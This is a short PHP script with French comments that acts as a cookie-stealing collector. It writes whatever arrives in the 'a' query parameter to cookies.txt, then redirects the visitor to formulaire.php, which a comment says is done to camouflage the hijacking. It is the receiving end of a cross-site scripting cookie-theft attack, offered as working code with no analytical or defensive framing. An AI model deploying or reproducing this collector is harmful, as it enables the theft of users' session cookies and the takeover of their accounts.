<?php
$cookie = $_GET['a'];
if ($cookie) {
// On ouvre cookies.txt en édition
    $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/cookies.txt', 'a');
// On écrit le contenu du cookie sur une nouvelle ligne
    fputs($fp, $cookie . "\r\n");
    echo "cookie : " . $cookie; // pour tracer
// On ferme le fichier cookies.txt
    fclose($fp);
}
?>
<script>
// On redirige la cible pour camoufler le détournement
    location.replace('formulaire.php');
</script>